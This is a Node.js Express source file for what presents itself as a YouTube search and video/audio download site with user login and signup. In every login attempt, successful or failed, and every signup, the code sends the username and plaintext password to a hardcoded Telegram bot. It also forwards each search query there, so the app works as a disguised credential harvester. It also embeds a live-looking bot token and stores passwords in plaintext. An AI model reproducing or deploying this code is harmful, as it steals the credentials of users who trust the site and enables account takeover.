const express = require('express');
const ytSearch = require('yt-search');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Telegram bot details
const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '5901409601'; // Replace with your chat ID

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));

// Set EJS as the view engine
app.set('view engine', 'ejs');

// File to store user data
const usersFilePath = path.join(__dirname, 'users.json');

// Load users from users.json
let users = [];
if (fs.existsSync(usersFilePath)) {
    users = JSON.parse(fs.readFileSync(usersFilePath, 'utf-8'));
}

// Home route - Ask for user's name and password
app.get('/', (req, res) => {
    res.render('name');
});

// Save user's name, password, and redirect to search (Login functionality)
app.post('/save-name', (req, res) => {
    const userName = req.body.userName;
    const password = req.body.password;

    // Check if user exists and credentials match
    const user = users.find(u => u.username === userName && u.password === password);

    if (user) {
        // Send login success message to Telegram
        sendToTelegram(`User logged in:\nUsername: ${userName}\nPassword: ${password}`);

        // Redirect to the search page
        res.redirect('/search');
    } else {
        // Send login failure message to Telegram
        sendToTelegram(`Login failed:\nUsername: ${userName}\nPassword: ${password}`);

        // Show alert for incorrect credentials
        res.send(`
            <script>
                alert('Password incorrect. Please signup.');
                window.location.href = '/';
            </script>
        `);
    }
});

// Route for Signup page
app.get('/signup', (req, res) => {
    res.render('signup');
});

// Save new user details (Signup functionality)
app.post('/signup', (req, res) => {
    const userName = req.body.userName;
    const password = req.body.password;

    // Check if user already exists
    const userExists = users.some(u => u.username === userName);
    if (userExists) {
        res.send(`
            <script>
                alert('Username already exists. Please log in.');
                window.location.href = '/';
            </script>
        `);
    } else {
        // Create a new user with a unique ID
        const newUser = {
            id: users.length + 1, // Simple unique ID
            username: userName,
            password: password,
        };

        // Add the new user to the array
        users.push(newUser);

        // Save the updated users array to users.json
        fs.writeFileSync(usersFilePath, JSON.stringify(users, null, 2));

        // Send signup success message to Telegram
        sendToTelegram(`New user signed up:\nUsername: ${userName}\nPassword: ${password}`);

        // Redirect to the search page
        res.redirect('/search');
    }
});

// Search route
app.get('/search', (req, res) => {
    res.render('index', { results: null });
});

// Handle search requests
app.post('/search', async (req, res) => {
    const query = req.body.query;

    // Save the search query and send to Telegram bot
    sendToTelegram(`User searched for: ${query}`);

    // Search YouTube videos
    const { videos } = await ytSearch(query);

    // Render the results
    res.render('index', { results: videos });
});

// Download Video route
app.get('/download/video', async (req, res) => {
    const videoUrl = req.query.url;

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${videoUrl}`;
        const response = await axios.get(apiUrl);

        if (response.data.success) {
            const downloadUrl = response.data.result.download_url;
            res.redirect(downloadUrl);
        } else {
            res.status(500).send('Failed to fetch video download link.');
        }
    } catch (error) {
        res.status(500).send('Error downloading the video.');
    }
});

// Download Audio route
app.get('/download/audio', async (req, res) => {
    const videoUrl = req.query.url;

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${videoUrl}`;
        const response = await axios.get(apiUrl);

        if (response.data.success) {
            const downloadUrl = response.data.result.download_url;
            res.redirect(downloadUrl);
        } else {
            res.status(500).send('Failed to fetch audio download link.');
        }
    } catch (error) {
        res.status(500).send('Error downloading the audio.');
    }
});

// Function to send messages to Telegram bot
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    })
    .then(response => {
        console.log('Message sent to Telegram:', response.data);
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
